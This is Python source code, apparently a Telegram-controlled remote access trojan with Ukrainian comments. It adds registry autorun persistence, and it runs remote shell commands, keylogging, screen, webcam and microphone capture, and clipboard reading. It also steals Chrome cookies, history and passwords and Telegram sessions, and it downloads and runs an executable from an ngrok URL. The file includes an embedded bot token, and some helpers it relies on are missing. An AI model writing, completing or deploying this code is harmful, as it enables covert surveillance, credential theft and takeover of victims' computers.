#client.py

# client_multi.py

import os
import sys
import time
import tempfile
import threading
import subprocess
import socket
import platform
import shutil
import sqlite3

# Бібліотеки для специфічних задач
import psutil               # системні ресурси
import cv2                  # камера
import pyaudio              # аудіо
import wave
import pyautogui            # скриншоти
import mss                  # live-стрім екрану
import mss.tools
import keyboard             # кейлогер
import requests             # для автооновлення
import ssl                  # TLS
from telethon import TelegramClient  # session stealer
from telegram.ext import Updater, MessageHandler, Filters, CallbackContext

# ================= ПАРАМЕТРИ =================
TOKEN       = "8191143023:AAExRgieoE_SIru5ZGflWbth_V5_Gchulyk"
API_ID      = 123456      # для Telethon
API_HASH    = "your_api_hash"
SESSION_NAME= "session"
DOWNLOAD_URL= "https://your.ngrok-free.app/client_multi.exe"
TMP         = tempfile.gettempdir()
ID          = socket.gethostname() + "_" + str(os.getpid())

# TLS-контекст
ssl_context = ssl.create_default_context()
# (можна замінити self-signed і завантажити серти на сервері бота)

# ================ АВТОЗАПУСК ================
def autorun():
    try:
        import winreg
        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ClientMultiService",0,winreg.REG_SZ,cmd)
        key.Close()
    except Exception:
        pass

# Реєстрація в боті
def register_client(updater):
    updater.bot.send_message(updater.bot.get_me().id, f"/register {ID}")

# =============== 1. Системна інформація ===============
def get_system_info():
    info = []
    info.append(f"Host: {socket.gethostname()}")
    info.append(f"User: {os.getlogin()}")
    info.append(f"OS: {platform.system()} {platform.release()}")
    info.append(f"Arch: {platform.machine()}")
    cpu_ph = psutil.cpu_count(logical=False)
    cpu_lo = psutil.cpu_count(logical=True)
    info.append(f"CPU Cores: {cpu_ph}/{cpu_lo}")
    mem = psutil.virtual_memory()
    info.append(f"RAM: {round(mem.total/1e9,2)}GB total, {round(mem.available/1e9,2)}GB free")
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "Unknown"
    info.append(f"IP: {ip}")
    return "\n".join(info)

# =============== 2. Файловий менеджер ===============
def list_dir(path="."):
    try:
        return "\n".join(os.listdir(path))
    except Exception as e:
        return f"Error: {e}"

def change_dir(path):
    try:
        os.chdir(path)
        return os.getcwd()
    except Exception as e:
        return f"Error: {e}"

def delete_path(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
        else:
            shutil.rmtree(path)
        return "Deleted"
    except Exception as e:
        return f"Error: {e}"

def move_path(src, dst):
    try:
        os.rename(src, dst)
        return "Moved"
    except Exception as e:
        return f"Error: {e}"

def copy_path(src, dst):
    try:
        shutil.copy(src, dst)
        return "Copied"
    except Exception as e:
        return f"Error: {e}"

# =============== 3. Список процесів ===============
def list_processes():
    return subprocess.check_output("tasklist", shell=True).decode(errors='ignore')

# =============== 4. Завершення процесу ===============
def kill_process(pid):
    return subprocess.getoutput(f"taskkill /PID {pid} /F")

# =============== 5. Shell‑команди ===============
def run_shell(cmd):
    return subprocess.getoutput(cmd)

# =============== 6. Скриншот ===============
def take_screenshot():
    path = os.path.join(TMP, f"{ID}_ss_{time.time()}.png")
    pyautogui.screenshot(path)
    return path

# =============== 7. Кейлогер ===============
def start_keylogger():
    log = os.path.join(TMP, f"{ID}_keylog.txt")
    def record():
        with open(log, 'a') as f:
            while True:
                e = keyboard.read_event()
                if e.event_type == keyboard.KEY_DOWN:
                    f.write(e.name)
    t = threading.Thread(target=record, daemon=True)
    t.start()
    return log

# =============== 8. Запис аудіо ===============
def record_audio(seconds=5):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = [stream.read(1024) for _ in range(int(44100/1024*seconds))]
    stream.stop_stream(); stream.close(); p.terminate()
    path = os.path.join(TMP, f"{ID}_au_{time.time()}.wav")
    wf = wave.open(path,'wb'); wf.setnchannels(1); wf.setsampwidth(p.get_sample_size(pyaudio.paInt16)); wf.setframerate(44100)
    wf.writeframes(b"".join(frames)); wf.close()
    return path

# =============== 9. Фото з камери ===============
def take_photo():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read(); cam.release()
    if not ret:
        return None
    path = os.path.join(TMP, f"{ID}_ph_{time.time()}.jpg")
    cv2.imwrite(path, frame)
    return path

# =============== 10. Live‑стрім екрану ===============
def live_screen(duration=5, fps=1):
    files = []
    with mss.mss() as sct:
        for _ in range(duration*fps):
            img = sct.grab(sct.monitors[1])
            p = os.path.join(TMP, f"{ID}_ls_{time.time()}.png")
            mss.tools.to_png(img.rgb, img.size, output=p)
            files.append(p)
            time.sleep(1/fps)
    archive = os.path.join(TMP, f"{ID}_ls_{time.time()}.zip")
    with zipfile.ZipFile(archive,'w') as z:
        for f in files:
            z.write(f, os.path.basename(f))
            os.remove(f)
    return archive

# =============== 11. Буфер обміну ===============
def get_clipboard():
    try:
        import ctypes
        CF_UNICODETEXT = 13
        ctypes.windll.user32.OpenClipboard(0)
        d = ctypes.windll.user32.GetClipboardData(CF_UNICODETEXT)
        text = ctypes.c_wchar_p(d).value
        ctypes.windll.user32.CloseClipboard()
        return text
    except:
        return ""

# =============== 12. Автооновлення RAT‑а ===============
def self_update(url=DOWNLOAD_URL):
    try:
        r = requests.get(url, verify=False)
        path = os.path.join(TMP, f"update_{time.time()}.exe")
        open(path,'wb').write(r.content)
        subprocess.Popen([path], shell=True)
        return "Updated"
    except Exception as e:
        return f"Error: {e}"

# =============== 13. Wi-Fi сканування ===============
def scan_wifi():
    out = subprocess.check_output("netsh wlan show networks mode=Bssid", shell=True).decode(errors='ignore')
    return out

# =============== 14. Запуск .exe ===============
def run_exe(path):
    try:
        subprocess.Popen(path, shell=True)
        return "Launched"
    except Exception as e:
        return f"Error: {e}"

# =============== 15. Блокування/розблокування ===============
def lock_screen():
    subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
def unlock_screen():
    # Потрібно вводити пароль, не реалізуємо
    return "Unlock not supported"

# =============== 16. Перезапуск/виключення ===============
def shutdown():
    subprocess.call("shutdown /s /t 0", shell=True)
def reboot():
    subprocess.call("shutdown /r /t 0", shell=True)

# =============== 17. Паролі браузерів ===============
def steal_browser_passwords():
    # Повторюємо Chrome збір
    return extract_chrome_passwords()  # реалізовано вище або в модулі

# =============== 18. Куки браузера ===============
def steal_cookies():
    # Пример для Chrome Cookies DB
    path_db = os.path.expanduser(r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
    if not os.path.exists(path_db):
        return "No Cookies DB"
    tmp = os.path.join(TMP, "cookies.db")
    shutil.copy(path_db, tmp)
    conn = sqlite3.connect(tmp); cur = conn.cursor()
    out = []
    for name, value, host in cur.execute("SELECT name, value, host_key FROM cookies"):
        out.append(f"{host}|{name}={value}")
    conn.close(); os.remove(tmp)
    return "\n".join(out)

# =============== 19. Історія браузера ===============
def steal_history():
    path_db = os.path.expanduser(r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    if not os.path.exists(path_db):
        return "No History DB"
    tmp = os.path.join(TMP, "history.db")
    shutil.copy(path_db, tmp)
    conn = sqlite3.connect(tmp); cur = conn.cursor()
    out = []
    for url, title, ts in cur.execute("SELECT url, title, last_visit_time FROM urls"):
        out.append(f"{title}|{url}")
    conn.close(); os.remove(tmp)
    return "\n".join(out)

# =============== 20. Telegram session stealer ===============
def steal_telegram_session():
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
    client.connect()
    if not client.is_user_authorized():
        return "Not authorized"
    session_file = f"{SESSION_NAME}.session"
    return open(session_file, 'rb')

# =============== 21. (TLS handled by ssl_context) ===============

# =============== 22-27. Telegram-бот ===============
def handle(update, ctx: CallbackContext):
    msg = update.message.text.strip().split(" ",1)
    cmd = msg[0].lower()
    arg = msg[1] if len(msg)>1 else ""
    if cmd=="/register":
        ctx.bot.send_message(update.effective_chat.id, f"REGISTERED {ID}")
    elif cmd=="/sysinfo":
        ctx.bot.send_message(update.effective_chat.id, get_system_info())
    elif cmd=="/ls":
        ctx.bot.send_message(update.effective_chat.id, list_dir(arg or "."))
    elif cmd=="/cd":
        ctx.bot.send_message(update.effective_chat.id, change_dir(arg))
    elif cmd=="/rm":
        ctx.bot.send_message(update.effective_chat.id, delete_path(arg))
    elif cmd=="/mv":
        src,dst = arg.split(" ",1)
        ctx.bot.send_message(update.effective_chat.id, move_path(src,dst))
    elif cmd=="/cp":
        src,dst = arg.split(" ",1)
        ctx.bot.send_message(update.effective_chat.id, copy_path(src,dst))
    elif cmd=="/ps":
        ctx.bot.send_message(update.effective_chat.id, list_processes())
    elif cmd=="/kill":
        ctx.bot.send_message(update.effective_chat.id, kill_process(arg))
    elif cmd=="/shell":
        ctx.bot.send_message(update.effective_chat.id, run_shell(arg))
    elif cmd=="/screenshot":
        p=take_screenshot(); ctx.bot.send_photo(update.effective_chat.id, open(p,'rb')); os.remove(p)
    elif cmd=="/keylog":
        log=start_keylogger(); time.sleep(5); ctx.bot.send_document(update.effective_chat.id, open(log,'rb')); os.remove(log)
    elif cmd=="/audio":
        p=record_audio(5); ctx.bot.send_audio(update.effective_chat.id, open(p,'rb')); os.remove(p)
    elif cmd=="/photo":
        p=take_photo(); ctx.bot.send_photo(update.effective_chat.id, open(p,'rb')); os.remove(p)
    elif cmd=="/livescreen":
        p=live_screen(5,1); ctx.bot.send_document(update.effective_chat.id, open(p,'rb')); os.remove(p)
    elif cmd=="/clip":
        ctx.bot.send_message(update.effective_chat.id, get_clipboard())
    elif cmd=="/update":
        ctx.bot.send_message(update.effective_chat.id, self_update(DOWNLOAD_URL))
    elif cmd=="/wifi":
        ctx.bot.send_message(update.effective_chat.id, scan_wifi())
    elif cmd=="/run":
        ctx.bot.send_message(update.effective_chat.id, run_exe(arg))
    elif cmd=="/lock":
        lock_screen(); ctx.bot.send_message(update.effective_chat.id, "Locked")
    elif cmd=="/unlock":
        ctx.bot.send_message(update.effective_chat.id, unlock_screen())
    elif cmd=="/shutdown":
        shutdown(); ctx.bot.send_message(update.effective_chat.id, "Shutting down")
    elif cmd=="/reboot":
        reboot(); ctx.bot.send_message(update.effective_chat.id, "Rebooting")
    elif cmd=="/pw":
        ctx.bot.send_message(update.effective_chat.id, steal_browser_passwords())
    elif cmd=="/cookies":
        ctx.bot.send_message(update.effective_chat.id, steal_cookies())
    elif cmd=="/history":
        ctx.bot.send_message(update.effective_chat.id, steal_history())
    elif cmd=="/tgsession":
        sess=steal_telegram_session(); ctx.bot.send_document(update.effective_chat.id, sess)
    elif cmd=="/getlink":
        ctx.bot.send_message(update.effective_chat.id, f"Download: {DOWNLOAD_URL}")
    # мультиклієнти підтримуються через bot_server, що шле /<cmd> конкретному ID

def main():
    autorun()
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(MessageHandler(Filters.text & Filters.private, handle))
    updater.start_polling()
    register_client(updater)
    updater.idle()

if __name__ == "__main__":
    main()
